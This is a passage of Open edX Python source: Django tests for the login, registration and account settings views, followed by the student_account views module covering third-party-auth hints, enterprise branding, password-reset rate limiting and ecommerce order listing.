        response = self.client.get(reverse('signin_user'), params, HTTP_ACCEPT=""text/html"")
        self.assertNotIn(response.content, tpa_hint)

    @ddt.data(
        ('signin_user', 'login'),
        ('register_user', 'register'),
    )
    @ddt.unpack
    def test_hinted_login_dialog_disabled(self, url_name, auth_entry):
        """"""Test that the dialog doesn't show up for hinted logins when disabled. """"""
        self.google_provider.skip_hinted_login_dialog = True
        self.google_provider.save()
        params = [(""next"", ""/courses/something/?tpa_hint=oa2-google-oauth2"")]
        response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=""text/html"")
        self.assertRedirects(
            response,
            'auth/login/google-oauth2/?auth_entry={}&next=%2Fcourses%2Fsomething%2F%3Ftpa_hint%3Doa2-google-oauth2'.format(auth_entry),
            target_status_code=302
        )

    @override_settings(FEATURES=dict(settings.FEATURES, THIRD_PARTY_AUTH_HINT='oa2-google-oauth2'))
    @ddt.data(
        'signin_user',
        'register_user',
    )
    def test_settings_tpa_hinted_login(self, url_name):
        """"""
        Ensure that settings.FEATURES['THIRD_PARTY_AUTH_HINT'] can set third_party_auth_hint.
        """"""
        params = [(""next"", ""/courses/something/"")]
        response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=""text/html"")
        self.assertContains(response, '""third_party_auth_hint"": ""oa2-google-oauth2""')

        # THIRD_PARTY_AUTH_HINT can be overridden via the query string
        tpa_hint = self.hidden_enabled_provider.provider_id
        params = [(""next"", ""/courses/something/?tpa_hint={0}"".format(tpa_hint))]
        response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=""text/html"")
        self.assertContains(response, '""third_party_auth_hint"": ""{0}""'.format(tpa_hint))

        # Even disabled providers in the query string will override THIRD_PARTY_AUTH_HINT
        tpa_hint = self.hidden_disabled_provider.provider_id
        params = [(""next"", ""/courses/something/?tpa_hint={0}"".format(tpa_hint))]
        response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=""text/html"")
        self.assertNotIn(response.content, tpa_hint)

    @override_settings(FEATURES=dict(settings.FEATURES, THIRD_PARTY_AUTH_HINT='oa2-google-oauth2'))
    @ddt.data(
        ('signin_user', 'login'),
        ('register_user', 'register'),
    )
    @ddt.unpack
    def test_settings_tpa_hinted_login_dialog_disabled(self, url_name, auth_entry):
        """"""Test that the dialog doesn't show up for hinted logins when disabled via settings.THIRD_PARTY_AUTH_HINT. """"""
        self.google_provider.skip_hinted_login_dialog = True
        self.google_provider.save()
        params = [(""next"", ""/courses/something/"")]
        response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=""text/html"")
        self.assertRedirects(
            response,
            'auth/login/google-oauth2/?auth_entry={}&next=%2Fcourses%2Fsomething%2F%3Ftpa_hint%3Doa2-google-oauth2'.format(auth_entry),
            target_status_code=302
        )

    @mock.patch('student_account.views.enterprise_customer_for_request')
    @ddt.data(
        ('signin_user', False, None, None, None),
        ('register_user', False, None, None, None),
        ('signin_user', True, 'Fake EC', 'http://logo.com/logo.jpg', u'{enterprise_name} - {platform_name}'),
        ('register_user', True, 'Fake EC', 'http://logo.com/logo.jpg', u'{enterprise_name} - {platform_name}'),
        ('signin_user', True, 'Fake EC', None, u'{enterprise_name} - {platform_name}'),
        ('register_user', True, 'Fake EC', None, u'{enterprise_name} - {platform_name}'),
        ('signin_user', True, 'Fake EC', 'http://logo.com/logo.jpg', None),
        ('register_user', True, 'Fake EC', 'http://logo.com/logo.jpg', None),
        ('signin_user', True, 'Fake EC', None, None),
        ('register_user', True, 'Fake EC', None, None),
    )
    @ddt.unpack
    def test_enterprise_register(self, url_name, ec_present, ec_name, logo_url, welcome_message, mock_get_ec):
        """"""
        Verify that when an EnterpriseCustomer is received on the login and register views,
        the appropriate sidebar is rendered.
        """"""
        if ec_present:
            mock_ec = mock_get_ec.return_value
            mock_ec.name = ec_name
            if logo_url:
                mock_ec.branding_configuration.logo.url = logo_url
            else:
                mock_ec.branding_configuration.logo = None
            if welcome_message:
                mock_ec.branding_configuration.welcome_message = welcome_message
            else:
                del mock_ec.branding_configuration.welcome_message
        else:
            mock_get_ec.return_value = None

        response = self.client.get(reverse(url_name), HTTP_ACCEPT=""text/html"")

        enterprise_sidebar_div_id = u'enterprise-content-container'

        if not ec_present:
            self.assertNotContains(response, text=enterprise_sidebar_div_id)
        else:
            self.assertContains(response, text=enterprise_sidebar_div_id)
            if not welcome_message:
                welcome_message = settings.ENTERPRISE_SPECIFIC_BRANDED_WELCOME_TEMPLATE
            expected_message = welcome_message.format(
                start_bold=u'<b>',
                end_bold=u'</b>',
                enterprise_name=ec_name,
                platform_name=settings.PLATFORM_NAME
            )
            self.assertContains(response, expected_message)
            if logo_url:
                self.assertContains(response, logo_url)

    def test_enterprise_cookie_delete(self):
        """"""
        Test that enterprise cookies are deleted in login/registration views.

        Cookies must be deleted in login/registration views so that *default* login/registration branding
        is displayed to subsequent requests from non-enterprise customers.
        """"""
        cookies = SimpleCookie()
        cookies[settings.ENTERPRISE_CUSTOMER_COOKIE_NAME] = 'test-enterprise-customer'
        response = self.client.get(reverse('signin_user'), HTTP_ACCEPT=""text/html"", cookies=cookies)

        self.assertIn(settings.ENTERPRISE_CUSTOMER_COOKIE_NAME, response.cookies)  # pylint:disable=no-member
        enterprise_cookie = response.cookies[settings.ENTERPRISE_CUSTOMER_COOKIE_NAME]  # pylint:disable=no-member

        self.assertEqual(enterprise_cookie['domain'], settings.BASE_COOKIE_DOMAIN)
        self.assertEqual(enterprise_cookie.value, '')

    @override_settings(SITE_NAME=settings.MICROSITE_TEST_HOSTNAME)
    def test_microsite_uses_old_login_page(self):
        # Retrieve the login page from a microsite domain
        # and verify that we're served the old page.
        resp = self.client.get(
            reverse(""signin_user""),
            HTTP_HOST=settings.MICROSITE_TEST_HOSTNAME
        )
        self.assertContains(resp, ""Log into your Test Site Account"")
        self.assertContains(resp, ""login-form"")

    def test_microsite_uses_old_register_page(self):
        # Retrieve the register page from a microsite domain
        # and verify that we're served the old page.
        resp = self.client.get(
            reverse(""register_user""),
            HTTP_HOST=settings.MICROSITE_TEST_HOSTNAME
        )
        self.assertContains(resp, ""Register for Test Site"")
        self.assertContains(resp, ""register-form"")

    def test_login_registration_xframe_protected(self):
        resp = self.client.get(
            reverse(""register_user""),
            {},
            HTTP_REFERER=""http://localhost/iframe""
        )

        self.assertEqual(resp['X-Frame-Options'], 'DENY')

        self.configure_lti_provider(name='Test', lti_hostname='localhost', lti_consumer_key='test_key', enabled=True)

        resp = self.client.get(
            reverse(""register_user""),
            HTTP_REFERER=""http://localhost/iframe""
        )

        self.assertEqual(resp['X-Frame-Options'], 'ALLOW')

    def _assert_third_party_auth_data(self, response, current_backend, current_provider, providers, expected_ec):
        """"""Verify that third party auth info is rendered correctly in a DOM data attribute. """"""
        finish_auth_url = None
        if current_backend:
            finish_auth_url = reverse(""social:complete"", kwargs={""backend"": current_backend}) + ""?""

        auth_info = {
            ""currentProvider"": current_provider,
            ""providers"": providers,
            ""secondaryProviders"": [],
            ""finishAuthUrl"": finish_auth_url,
            ""errorMessage"": None,
            ""registerFormSubmitButtonText"": ""Create Account"",
        }
        if expected_ec is not None:
            # If we set an EnterpriseCustomer, third-party auth providers ought to be hidden.
            auth_info['providers'] = []
        auth_info = dump_js_escaped_json(auth_info)

        expected_data = '""third_party_auth"": {auth_info}'.format(
            auth_info=auth_info
        )

        self.assertContains(response, expected_data)

    def _third_party_login_url(self, backend_name, auth_entry, login_params):
        """"""Construct the login URL to start third party authentication. """"""
        return u""{url}?auth_entry={auth_entry}&{param_str}"".format(
            url=reverse(""social:begin"", kwargs={""backend"": backend_name}),
            auth_entry=auth_entry,
            param_str=self._finish_auth_url_param(login_params),
        )

    def _finish_auth_url_param(self, params):
        """"""
        Make the next=... URL parameter that indicates where the user should go next.

        >>> _finish_auth_url_param([('next', '/dashboard')])
        '/account/finish_auth?next=%2Fdashboard'
        """"""
        return urlencode({
            'next': '/account/finish_auth?{}'.format(urlencode(params))
        })

    def test_english_by_default(self):
        response = self.client.get(reverse('signin_user'), [], HTTP_ACCEPT=""text/html"")

        self.assertEqual(response['Content-Language'], 'en')

    def test_unsupported_language(self):
        response = self.client.get(reverse('signin_user'), [], HTTP_ACCEPT=""text/html"", HTTP_ACCEPT_LANGUAGE=""ts-zx"")

        self.assertEqual(response['Content-Language'], 'en')

    def test_browser_language(self):
        response = self.client.get(reverse('signin_user'), [], HTTP_ACCEPT=""text/html"", HTTP_ACCEPT_LANGUAGE=""es"")

        self.assertEqual(response['Content-Language'], 'es-419')

    def test_browser_language_dialent(self):
        response = self.client.get(reverse('signin_user'), [], HTTP_ACCEPT=""text/html"", HTTP_ACCEPT_LANGUAGE=""es-es"")

        self.assertEqual(response['Content-Language'], 'es-es')


class AccountSettingsViewTest(ThirdPartyAuthTestMixin, TestCase, ProgramsApiConfigMixin):
    """""" Tests for the account settings view. """"""

    USERNAME = 'student'
    PASSWORD = 'password'
    FIELDS = [
        'country',
        'gender',
        'language',
        'level_of_education',
        'password',
        'year_of_birth',
        'preferred_language',
        'time_zone',
    ]

    @mock.patch(""django.conf.settings.MESSAGE_STORAGE"", 'django.contrib.messages.storage.cookie.CookieStorage')
    def setUp(self):
        super(AccountSettingsViewTest, self).setUp()
        self.user = UserFactory.create(username=self.USERNAME, password=self.PASSWORD)
        CommerceConfiguration.objects.create(cache_ttl=10, enabled=True)
        self.client.login(username=self.USERNAME, password=self.PASSWORD)

        self.request = HttpRequest()
        self.request.user = self.user

        # For these tests, two third party auth providers are enabled by default:
        self.configure_google_provider(enabled=True, visible=True)
        self.configure_facebook_provider(enabled=True, visible=True)

        # Python-social saves auth failure notifcations in Django messages.
        # See pipeline.get_duplicate_provider() for details.
        self.request.COOKIES = {}
        MessageMiddleware().process_request(self.request)
        messages.error(self.request, 'Facebook is already in use.', extra_tags='Auth facebook')

    def test_context(self):

        context = account_settings_context(self.request)

        user_accounts_api_url = reverse(""accounts_api"", kwargs={'username': self.user.username})
        self.assertEqual(context['user_accounts_api_url'], user_accounts_api_url)

        user_preferences_api_url = reverse('preferences_api', kwargs={'username': self.user.username})
        self.assertEqual(context['user_preferences_api_url'], user_preferences_api_url)

        for attribute in self.FIELDS:
            self.assertIn(attribute, context['fields'])

        self.assertEqual(
            context['user_accounts_api_url'], reverse(""accounts_api"", kwargs={'username': self.user.username})
        )
        self.assertEqual(
            context['user_preferences_api_url'], reverse('preferences_api', kwargs={'username': self.user.username})
        )

        self.assertEqual(context['duplicate_provider'], 'facebook')
        self.assertEqual(context['auth']['providers'][0]['name'], 'Facebook')
        self.assertEqual(context['auth']['providers'][1]['name'], 'Google')

    def test_view(self):
        """"""
        Test that all fields are  visible
        """"""
        view_path = reverse('account_settings')
        response = self.client.get(path=view_path)

        for attribute in self.FIELDS:
            self.assertIn(attribute, response.content)

    def test_header_with_programs_listing_enabled(self):
        """"""
        Verify that tabs header will be shown while program listing is enabled.
        """"""
        self.create_programs_config()
        view_path = reverse('account_settings')
        response = self.client.get(path=view_path)

        self.assertContains(response, '<li class=""tab-nav-item"">')

    def test_header_with_programs_listing_disabled(self):
        """"""
        Verify that nav header will be shown while program listing is disabled.
        """"""
        self.create_programs_config(enabled=False)
        view_path = reverse('account_settings')
        response = self.client.get(path=view_path)

        self.assertContains(response, '<li class=""item nav-global-01"">')

    def test_commerce_order_detail(self):
        """"""
        Verify that get_user_orders returns the correct order data.
        """"""
        with mock_get_orders():
            order_detail = get_user_orders(self.user)

        for i, order in enumerate(mock_get_orders.default_response['results']):
            expected = {
                'number': order['number'],
                'price': order['total_excl_tax'],
                'order_date': 'Jan 01, 2016',
                'receipt_url': '/checkout/receipt/?order_number=' + order['number'],
                'lines': order['lines'],
            }
            self.assertEqual(order_detail[i], expected)

    def test_commerce_order_detail_exception(self):
        with mock_get_orders(exception=exceptions.HttpNotFoundError):
            order_detail = get_user_orders(self.user)

        self.assertEqual(order_detail, [])

    def test_incomplete_order_detail(self):
        response = {
            'results': [
                factories.OrderFactory(
                    status='Incomplete',
                    lines=[
                        factories.OrderLineFactory(
                            product=factories.ProductFactory(attribute_values=[factories.ProductAttributeFactory()])
                        )
                    ]
                )
            ]
        }
        with mock_get_orders(response=response):
            order_detail = get_user_orders(self.user)

        self.assertEqual(order_detail, [])

    def test_order_history_with_no_product(self):
        response = {
            'results': [
                factories.OrderFactory(
                    lines=[
                        factories.OrderLineFactory(
                            product=None
                        ),
                        factories.OrderLineFactory(
                            product=factories.ProductFactory(attribute_values=[factories.ProductAttributeFactory(
                                name='certificate_type',
                                value='verified'
                            )])
                        )
                    ]
                )
            ]
        }
        with mock_get_orders(response=response):
            order_detail = get_user_orders(self.user)

        self.assertEqual(len(order_detail), 1)


@override_settings(SITE_NAME=settings.MICROSITE_LOGISTRATION_HOSTNAME)
class MicrositeLogistrationTests(TestCase):
    """"""
    Test to validate that microsites can display the logistration page
    """"""

    def test_login_page(self):
        """"""
        Make sure that we get the expected logistration page on our specialized
        microsite
        """"""

        resp = self.client.get(
            reverse('signin_user'),
            HTTP_HOST=settings.MICROSITE_LOGISTRATION_HOSTNAME
        )
        self.assertEqual(resp.status_code, 200)

        self.assertIn('<div id=""login-and-registration-container""', resp.content)

    def test_registration_page(self):
        """"""
        Make sure that we get the expected logistration page on our specialized
        microsite
        """"""

        resp = self.client.get(
            reverse('register_user'),
            HTTP_HOST=settings.MICROSITE_LOGISTRATION_HOSTNAME
        )
        self.assertEqual(resp.status_code, 200)

        self.assertIn('<div id=""login-and-registration-container""', resp.content)

    @override_settings(SITE_NAME=settings.MICROSITE_TEST_HOSTNAME)
    def test_no_override(self):
        """"""
        Make sure we get the old style login/registration if we don't override
        """"""

        resp = self.client.get(
            reverse('signin_user'),
            HTTP_HOST=settings.MICROSITE_TEST_HOSTNAME
        )
        self.assertEqual(resp.status_code, 200)

        self.assertNotIn('<div id=""login-and-registration-container""', resp.content)

        resp = self.client.get(
            reverse('register_user'),
            HTTP_HOST=settings.MICROSITE_TEST_HOSTNAME
        )
        self.assertEqual(resp.status_code, 200)

        self.assertNotIn('<div id=""login-and-registration-container""', resp.content)


class AccountCreationTestCaseWithSiteOverrides(SiteMixin, TestCase):
    """"""
    Test cases for Feature flag ALLOW_PUBLIC_ACCOUNT_CREATION which when
    turned off disables the account creation options in lms
    """"""

    def setUp(self):
        """"""Set up the tests""""""
        super(AccountCreationTestCaseWithSiteOverrides, self).setUp()

        # Set the feature flag ALLOW_PUBLIC_ACCOUNT_CREATION to False
        self.site_configuration_values = {
            'ALLOW_PUBLIC_ACCOUNT_CREATION': False
        }
        self.site_domain = 'testserver1.com'
        self.set_up_site(self.site_domain, self.site_configuration_values)

    def test_register_option_login_page(self):
        """"""
        Navigate to the login page and check the Register option is hidden when
        ALLOW_PUBLIC_ACCOUNT_CREATION flag is turned off
        """"""
        response = self.client.get(reverse('signin_user'))
        self.assertNotIn('<a class=""btn-neutral"" href=""/register?next=%2Fdashboard"">Register</a>',
                         response.content)
/n/n/nlms/djangoapps/student_account/views.py/n/n"""""" Views for a student's account information. """"""

import json
import logging
import urlparse
from datetime import datetime

from django.conf import settings
from django.contrib import messages
from django.contrib.auth import get_user_model
from django.contrib.auth.decorators import login_required
from django.core.urlresolvers import reverse
from django.http import HttpResponse, HttpResponseBadRequest, HttpResponseForbidden
from django.shortcuts import redirect
from django.utils.translation import ugettext as _
from django.views.decorators.csrf import ensure_csrf_cookie
from django.views.decorators.http import require_http_methods
from django_countries import countries

import third_party_auth
from commerce.models import CommerceConfiguration
from edxmako.shortcuts import render_to_response
from lms.djangoapps.commerce.utils import EcommerceService
from openedx.core.djangoapps.commerce.utils import ecommerce_api_client
from openedx.core.djangoapps.external_auth.login_and_register import login as external_auth_login
from openedx.core.djangoapps.external_auth.login_and_register import register as external_auth_register
from openedx.core.djangoapps.lang_pref.api import all_languages, released_languages
from openedx.core.djangoapps.programs.models import ProgramsApiConfig
from openedx.core.djangoapps.site_configuration import helpers as configuration_helpers
from openedx.core.djangoapps.theming.helpers import is_request_in_themed_site
from openedx.core.djangoapps.user_api.accounts.api import request_password_change
from openedx.core.djangoapps.user_api.api import (
    RegistrationFormFactory,
    get_login_session_form,
    get_password_reset_form
)
from openedx.core.djangoapps.user_api.errors import UserNotFound
from openedx.core.lib.edx_api_utils import get_edx_api_data
from openedx.core.lib.time_zone_utils import TIME_ZONE_CHOICES
from openedx.features.enterprise_support.api import enterprise_customer_for_request
from student.helpers import destroy_oauth_tokens, get_next_url_for_login_page
from student.models import UserProfile
from student.views import register_user as old_register_view
from student.views import signin_user as old_login_view
from third_party_auth import pipeline
from third_party_auth.decorators import xframe_allow_whitelisted
from util.bad_request_rate_limiter import BadRequestRateLimiter
from util.date_utils import strftime_localized

AUDIT_LOG = logging.getLogger(""audit"")
log = logging.getLogger(__name__)
User = get_user_model()  # pylint:disable=invalid-name


@require_http_methods(['GET'])
@ensure_csrf_cookie
@xframe_allow_whitelisted
def login_and_registration_form(request, initial_mode=""login""):
    """"""Render the combined login/registration form, defaulting to login

    This relies on the JS to asynchronously load the actual form from
    the user_api.

    Keyword Args:
        initial_mode (string): Either ""login"" or ""register"".

    """"""
    # Determine the URL to redirect to following login/registration/third_party_auth
    redirect_to = get_next_url_for_login_page(request)
    # If we're already logged in, redirect to the dashboard
    if request.user.is_authenticated():
        return redirect(redirect_to)

    # Retrieve the form descriptions from the user API
    form_descriptions = _get_form_descriptions(request)

    # Our ?next= URL may itself contain a parameter 'tpa_hint=x' that we need to check.
    # If present, we display a login page focused on third-party auth with that provider.
    third_party_auth_hint = None
    if '?' in redirect_to:
        try:
            next_args = urlparse.parse_qs(urlparse.urlparse(redirect_to).query)
            provider_id = next_args['tpa_hint'][0]
            tpa_hint_provider = third_party_auth.provider.Registry.get(provider_id=provider_id)
            if tpa_hint_provider:
                if tpa_hint_provider.skip_hinted_login_dialog:
                    # Forward the user directly to the provider's login URL when the provider is configured
                    # to skip the dialog.
                    if initial_mode == ""register"":
                        auth_entry = pipeline.AUTH_ENTRY_REGISTER
                    else:
                        auth_entry = pipeline.AUTH_ENTRY_LOGIN
                    return redirect(
                        pipeline.get_login_url(provider_id, auth_entry, redirect_url=redirect_to)
                    )
                third_party_auth_hint = provider_id
                initial_mode = ""hinted_login""
        except (KeyError, ValueError, IndexError) as ex:
            log.error(""Unknown tpa_hint provider: %s"", ex)

    # If this is a themed site, revert to the old login/registration pages.
    # We need to do this for now to support existing themes.
    # Themed sites can use the new logistration page by setting
    # 'ENABLE_COMBINED_LOGIN_REGISTRATION' in their
    # configuration settings.
    if is_request_in_themed_site() and not configuration_helpers.get_value('ENABLE_COMBINED_LOGIN_REGISTRATION', False):
        if initial_mode == ""login"":
            return old_login_view(request)
        elif initial_mode == ""register"":
            return old_register_view(request)

    # Allow external auth to intercept and handle the request
    ext_auth_response = _external_auth_intercept(request, initial_mode)
    if ext_auth_response is not None:
        return ext_auth_response

    # Account activation message
    account_activation_messages = [
        {
            'message': message.message, 'tags': message.tags
        } for message in messages.get_messages(request) if 'account-activation' in message.tags
    ]

    # Otherwise, render the combined login/registration page
    context = {
        'data': {
            'login_redirect_url': redirect_to,
            'initial_mode': initial_mode,
            'third_party_auth': _third_party_auth_context(request, redirect_to, third_party_auth_hint),
            'third_party_auth_hint': third_party_auth_hint or '',
            'platform_name': configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME),
            'support_link': configuration_helpers.get_value('SUPPORT_SITE_LINK', settings.SUPPORT_SITE_LINK),
            'password_reset_support_link': configuration_helpers.get_value(
                'PASSWORD_RESET_SUPPORT_LINK', settings.PASSWORD_RESET_SUPPORT_LINK
            ) or settings.SUPPORT_SITE_LINK,
            'account_activation_messages': account_activation_messages,

            # Include form descriptions retrieved from the user API.
            # We could have the JS client make these requests directly,
            # but we include them in the initial page load to avoid
            # the additional round-trip to the server.
            'login_form_desc': json.loads(form_descriptions['login']),
            'registration_form_desc': json.loads(form_descriptions['registration']),
            'password_reset_form_desc': json.loads(form_descriptions['password_reset']),
            'account_creation_allowed': configuration_helpers.get_value(
                'ALLOW_PUBLIC_ACCOUNT_CREATION', settings.FEATURES.get('ALLOW_PUBLIC_ACCOUNT_CREATION', True))
        },
        'login_redirect_url': redirect_to,  # This gets added to the query string of the ""Sign In"" button in header
        'responsive': True,
        'allow_iframing': True,
        'disable_courseware_js': True,
        'combined_login_and_register': True,
        'disable_footer': not configuration_helpers.get_value(
            'ENABLE_COMBINED_LOGIN_REGISTRATION_FOOTER',
            settings.FEATURES['ENABLE_COMBINED_LOGIN_REGISTRATION_FOOTER']
        ),
    }

    context = update_context_for_enterprise(request, context)

    response = render_to_response('student_account/login_and_register.html', context)

    # Remove enterprise cookie so that subsequent requests show default login page.
    response.delete_cookie(
        configuration_helpers.get_value(""ENTERPRISE_CUSTOMER_COOKIE_NAME"", settings.ENTERPRISE_CUSTOMER_COOKIE_NAME),
        domain=configuration_helpers.get_value(""BASE_COOKIE_DOMAIN"", settings.BASE_COOKIE_DOMAIN),
    )

    return response


@require_http_methods(['POST'])
def password_change_request_handler(request):
    """"""Handle password change requests originating from the account page.

    Uses the Account API to email the user a link to the password reset page.

    Note:
        The next step in the password reset process (confirmation) is currently handled
        by student.views.password_reset_confirm_wrapper, a custom wrapper around Django's
        password reset confirmation view.

    Args:
        request (HttpRequest)

    Returns:
        HttpResponse: 200 if the email was sent successfully
        HttpResponse: 400 if there is no 'email' POST parameter
        HttpResponse: 403 if the client has been rate limited
        HttpResponse: 405 if using an unsupported HTTP method

    Example usage:

        POST /account/password

    """"""

    limiter = BadRequestRateLimiter()
    if limiter.is_rate_limit_exceeded(request):
        AUDIT_LOG.warning(""Password reset rate limit exceeded"")
        return HttpResponseForbidden()

    user = request.user
    # Prefer logged-in user's email
    email = user.email if user.is_authenticated() else request.POST.get('email')

    if email:
        try:
            request_password_change(email, request.is_secure())
            user = user if user.is_authenticated() else User.objects.get(email=email)
            destroy_oauth_tokens(user)
        except UserNotFound:
            AUDIT_LOG.info(""Invalid password reset attempt"")
            # Increment the rate limit counter
            limiter.tick_bad_request_counter(request)

        return HttpResponse(status=200)
    else:
        return HttpResponseBadRequest(_(""No email address provided.""))


def update_context_for_enterprise(request, context):
    """"""
    Take the processed context produced by the view, determine if it's relevant
    to a particular Enterprise Customer, and update it to include that customer's
    enterprise metadata.
    """"""

    context = context.copy()

    sidebar_context = enterprise_sidebar_context(request)

    if sidebar_context:
        context['data']['registration_form_desc']['fields'] = enterprise_fields_only(
            context['data']['registration_form_desc']
        )
        context.update(sidebar_context)
        context['enable_enterprise_sidebar'] = True
        context['data']['hide_auth_warnings'] = True
    else:
        context['enable_enterprise_sidebar'] = False

    return context


def enterprise_fields_only(fields):
    """"""
    Take the received field definition, and exclude those fields that we don't want
    to require if the user is going to be a member of an Enterprise Customer.
    """"""
    enterprise_exclusions = configuration_helpers.get_value(
        'ENTERPRISE_EXCLUDED_REGISTRATION_FIELDS',
        settings.ENTERPRISE_EXCLUDED_REGISTRATION_FIELDS
    )
    return [field for field in fields['fields'] if field['name'] not in enterprise_exclusions]


def enterprise_sidebar_context(request):
    """"""
    Given the current request, render the HTML of a sidebar for the current
    logistration view that depicts Enterprise-related information.
    """"""
    enterprise_customer = enterprise_customer_for_request(request)

    if not enterprise_customer:
        return {}

    platform_name = configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME)

    if enterprise_customer.branding_configuration.logo:
        enterprise_logo_url = enterprise_customer.branding_configuration.logo.url
    else:
        enterprise_logo_url = ''

    if getattr(enterprise_customer.branding_configuration, 'welcome_message', None):
        branded_welcome_template = enterprise_customer.branding_configuration.welcome_message
    else:
        branded_welcome_template = configuration_helpers.get_value(
            'ENTERPRISE_SPECIFIC_BRANDED_WELCOME_TEMPLATE',
            settings.ENTERPRISE_SPECIFIC_BRANDED_WELCOME_TEMPLATE
        )

    branded_welcome_string = branded_welcome_template.format(
        start_bold=u'<b>',
        end_bold=u'</b>',
        enterprise_name=enterprise_customer.name,
        platform_name=platform_name
    )

    platform_welcome_template = configuration_helpers.get_value(
        'ENTERPRISE_PLATFORM_WELCOME_TEMPLATE',
        settings.ENTERPRISE_PLATFORM_WELCOME_TEMPLATE
    )
    platform_welcome_string = platform_welcome_template.format(platform_name=platform_name)

    context = {
        'enterprise_name': enterprise_customer.name,
        'enterprise_logo_url': enterprise_logo_url,
        'enterprise_branded_welcome_string': branded_welcome_string,
        'platform_welcome_string': platform_welcome_string,
    }

    return context


def _third_party_auth_context(request, redirect_to, tpa_hint=None):
    """"""Context for third party auth providers and the currently running pipeline.

    Arguments:
        request (HttpRequest): The request, used to determine if a pipeline
            is currently running.
        redirect_to: The URL to send the user to following successful
            authentication.
        tpa_hint (string): An override flag that will return a matching provider
            as long as its configuration has been enabled

    Returns:
        dict

    """"""
    context = {
        ""currentProvider"": None,
        ""providers"": [],
        ""secondaryProviders"": [],
        ""finishAuthUrl"": None,
        ""errorMessage"": None,
        ""registerFormSubmitButtonText"": _(""Create Account""),
    }

    if third_party_auth.is_enabled():
        enterprise_customer = enterprise_customer_for_request(request)
        if not enterprise_customer:
            for enabled in third_party_auth.provider.Registry.displayed_for_login(tpa_hint=tpa_hint):
                info = {
                    ""id"": enabled.provider_id,
                    ""name"": enabled.name,
                    ""iconClass"": enabled.icon_class or None,
                    ""iconImage"": enabled.icon_image.url if enabled.icon_image else None,
                    ""loginUrl"": pipeline.get_login_url(
                        enabled.provider_id,
                        pipeline.AUTH_ENTRY_LOGIN,
                        redirect_url=redirect_to,
                    ),
                    ""registerUrl"": pipeline.get_login_url(
                        enabled.provider_id,
                        pipeline.AUTH_ENTRY_REGISTER,
                        redirect_url=redirect_to,
                    ),
                }
                context[""providers"" if not enabled.secondary else ""secondaryProviders""].append(info)

        running_pipeline = pipeline.get(request)
        if running_pipeline is not None:
            current_provider = third_party_auth.provider.Registry.get_from_pipeline(running_pipeline)

            if current_provider is not None:
                context[""currentProvider""] = current_provider.name
                context[""finishAuthUrl""] = pipeline.get_complete_url(current_provider.backend_name)

                if current_provider.skip_registration_form:
                    # For enterprise (and later for everyone), we need to get explicit consent to the
                    # Terms of service instead of auto submitting the registration form outright.
                    if not enterprise_customer:
                        # As a reliable way of ""skipping"" the registration form, we just submit it automatically
                        context[""autoSubmitRegForm""] = True
                    else:
                        context[""autoRegisterWelcomeMessage""] = (
                            'Thank you for joining {}. '
                            'Just a couple steps before you start learning!'
                        ).format(
                            configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME)
                        )
                        context[""registerFormSubmitButtonText""] = _(""Continue"")

        # Check for any error messages we may want to display:
        for msg in messages.get_messages(request):
            if msg.extra_tags.split()[0] == ""social-auth"":
                # msg may or may not be translated. Try translating [again] in case we are able to:
                context['errorMessage'] = _(unicode(msg))  # pylint: disable=translation-of-non-string
                break

    return context


def _get_form_descriptions(request):
    """"""Retrieve form descriptions from the user API.

    Arguments:
        request (HttpRequest): The original request, used to retrieve session info.

    Returns:
        dict: Keys are 'login', 'registration', and 'password_reset';
            values are the JSON-serialized form descriptions.

    """"""

    return {
        'password_reset': get_password_reset_form().to_json(),
        'login': get_login_session_form().to_json(),
        'registration': RegistrationFormFactory().get_registration_form(request).to_json()
    }


def _external_auth_intercept(request, mode):
    """"""Allow external auth to intercept a login/registration request.

    Arguments:
        request (Request): The original request.
        mode (str): Either ""login"" or ""register""

    Returns:
        Response or None

    """"""
    if mode == ""login"":
        return external_auth_login(request)
    elif mode == ""register"":
        return external_auth_register(request)


def get_user_orders(user):
    """"""Given a user, get the detail of all the orders from the Ecommerce service.

    Args:
        user (User): The user to authenticate as when requesting ecommerce.

    Returns:
        list of dict, representing orders returned by the Ecommerce service.
    """"""
    no_data = []
    user_orders = []
    commerce_configuration = CommerceConfiguration.current()
    user_query = {'username': user.username}

    use_cache = commerce_configuration.is_cache_enabled
    cache_key = commerce_configuration.CACHE_KEY + '.' + str(user.id) if use_cache else None
    api = ecommerce_api_client(user)
    commerce_user_orders = get_edx_api_data(
        commerce_configuration, 'orders', api=api, querystring=user_query, cache_key=cache_key
    )

    for order in commerce_user_orders:
        if order['status'].lower() == 'complete':
            date_placed = datetime.strptime(order['date_placed'], ""%Y-%m-%dT%H:%M:%SZ"")
            order_data = {
                'number': order['number'],
                'price': order['total_excl_tax'],
                'order_date': strftime_localized(date_placed, 'SHORT_DATE'),
                'receipt_url': EcommerceService().get_receipt_page_url(order['number']),
                'lines': order['lines'],
            }
            user_orders.append(order_data)

    return user_orders


@login_required
@require_http_methods(['GET'])
def account_settings(request):
    """"""Render the current user's account settings page.

    Args:
        request (HttpRequest)

    Returns:
        HttpResponse: 200 if the page was sent successfully
        HttpResponse: 302 if not logged in (redirect to login page)
        HttpResponse: 405 if using an unsupported HTTP method

    Example usage:

        GET /account/settings

    """"""
    return render_to_response('student_account/account_settings.html', account_settings_context(request))


@login_required
@require_http_methods(['GET'])
def finish_auth(request):  # pylint: disable=unused-argument
    """""" Following logistration (1st or 3rd party), handle any special query string params.

    See FinishAuthView.js for details on the query string params.

    e.g. auto-enroll the user in a course, set email opt-in preference.

    This view just displays a ""Please wait"" message while AJAX calls are made to enroll the
    user in the course etc. This view is only used if a parameter like ""course_id"" is present
    during login/registration/third_party_auth. Otherwise, there is no need for it.

    Ideally this view will finish and redirect to the next step before the user even sees it.

    Args:
        request (HttpRequest)

    Returns:
        HttpResponse: 200 if the page was sent successfully
        HttpResponse: 302 if not logged in (redirect to login page)
        HttpResponse: 405 if using an unsupported HTTP method

    Example usage:

        GET /account/finish_auth/?course_id=course-v1:blah&enrollment_action=enroll

    """"""
    return render_to_response('student_account/finish_auth.html', {
        'disable_courseware_js': True,
        'disable_footer': True,
    })


def account_settings_context(request):
    """""" Context for the account settings page.

    Args:
        request: The request object.

    Returns:
